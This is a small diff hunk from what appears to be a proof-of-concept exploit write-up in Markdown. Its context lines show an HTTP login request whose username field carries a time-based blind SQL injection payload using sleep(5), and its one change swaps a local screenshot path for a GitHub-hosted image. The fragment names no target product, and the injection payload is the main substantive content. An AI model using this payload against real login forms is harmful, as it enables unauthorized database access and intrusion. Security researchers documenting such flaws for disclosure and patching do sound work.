@@ -25,4 +25,4 @@ Accept-Language: zh-CN,zh;q=0.9
 captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
 ```
 
-![image-20240618185509099](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618185509099.png)
+![image](https://github.com/hardog123/poc-exp/assets/170905460/5dac62c6-19f2-42f3-a664-e73dbc93aba8)
